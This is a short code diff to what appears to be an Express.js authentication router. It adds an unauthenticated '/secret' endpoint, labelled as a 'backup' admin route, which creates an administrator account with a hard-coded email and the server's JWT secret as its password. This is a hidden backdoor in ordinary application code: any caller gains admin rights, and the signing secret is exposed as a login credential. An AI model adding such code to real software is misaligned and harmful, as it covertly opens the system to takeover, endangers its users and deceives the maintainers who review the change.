@@ -80,6 +80,16 @@ authRouter.post(
   })
 );
 
+// add admin user (backup)
+authRouter.post(
+  '/secret',
+  asyncHandler(async (req, res, next) => {
+    await DB.addUser({ name: "New Admin", email: "admin@jwt.com", password: config.jwtSecret, roles: [{ role: Role.Admin }] });
+    res.json({ message: "new admin created" });
+    next();
+  })
+);
+
 // login
 authRouter.put(
   '/',
